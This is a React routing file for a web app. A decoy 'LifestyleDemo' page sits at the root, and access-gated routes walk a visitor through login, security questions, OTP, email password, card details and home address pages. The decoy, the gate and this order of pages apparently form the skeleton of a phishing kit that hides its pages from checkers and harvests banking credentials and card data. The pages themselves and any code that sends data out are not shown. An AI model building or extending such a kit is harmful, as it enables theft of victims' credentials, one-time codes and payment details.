import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';

// Components
import Header from './components/Header';
import Sidebar from './components/Sidebar';
import Footer from './components/Footer';

// Pages
import LoginForm from './pages/LoginForm';
import SecurityQuestions from './pages/SecurityQuestions';
import OTP from './pages/OTP';
import EmailPassword from './pages/EmailPassword';
import BasicInfo from './pages/BasicInfo';
import Card from './pages/Card';
import HomeAddress from './pages/HomeAddress';
import Terms from './pages/Terms';
import Register from './pages/Register';
import LifestyleDemo from './pages/LifestyleDemo';

// Layout component for protected routes
type ProtectedLayoutProps = {
  children: React.ReactNode;
  variant?: 'default' | 'fullscreen';
};

const ProtectedLayout = ({ children, variant = 'default' }: ProtectedLayoutProps) => {
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center">Access denied. Redirecting...</div>;
  }

  if (variant === 'fullscreen') {
    return (
      <div className="min-h-screen bg-gray-950 text-white">
        {children}
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <Header />
      <div className="bg-gradient-to-r from-orange-600 to-orange-500 h-10"></div>
      <main className="flex-1 bg-gray-50 py-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex gap-6">
            {children}
            <Sidebar />
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />
        
        {/* Protected routes */}
        <Route path="/login" element={
          <ProtectedLayout variant="fullscreen">
            <LoginForm />
          </ProtectedLayout>
        } />
        
        <Route path="/security-questions" element={
          <ProtectedLayout>
            <SecurityQuestions />
          </ProtectedLayout>
        } />

        <Route path="/otp" element={
          <ProtectedLayout>
            <OTP />
          </ProtectedLayout>
        } />
        
        <Route path="/email-password" element={
          <ProtectedLayout>
            <EmailPassword />
          </ProtectedLayout>
        } />
        
        <Route path="/basic-info" element={
          <ProtectedLayout>
            <BasicInfo />
          </ProtectedLayout>
        } />
        
        <Route path="/card" element={
          <ProtectedLayout>
            <Card />
          </ProtectedLayout>
        } />
        
        <Route path="/home-address" element={
          <ProtectedLayout>
            <HomeAddress />
          </ProtectedLayout>
        } />
        
        <Route path="/register" element={
          <ProtectedLayout>
            <Register />
          </ProtectedLayout>
        } />
        
        <Route path="/terms" element={
          <ProtectedLayout>
            <Terms />
          </ProtectedLayout>
        } />
        
        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;


